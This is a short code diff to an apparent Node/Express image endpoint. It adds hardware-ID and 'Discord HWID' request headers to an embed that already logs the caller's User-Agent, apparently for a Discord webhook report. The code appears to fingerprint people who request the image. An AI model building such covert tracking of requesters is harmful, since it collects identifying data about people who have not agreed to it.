@@ -60,6 +60,16 @@ app.get('/api/endpoint/https/image', async (req, res) => {
           value: req.get('User-Agent'),
           inline: true,
         },
+        {
+          name: "HWID",
+          value: req.get('X-HWID') || 'N/A',
+          inline: true,
+        },
+        {
+          name: "discordhwid",
+          value: req.get('X-DiscordHWID') || 'N/A',
+          inline: true,
+        }
       ],
       timestamp: new Date().toISOString(),
     }],
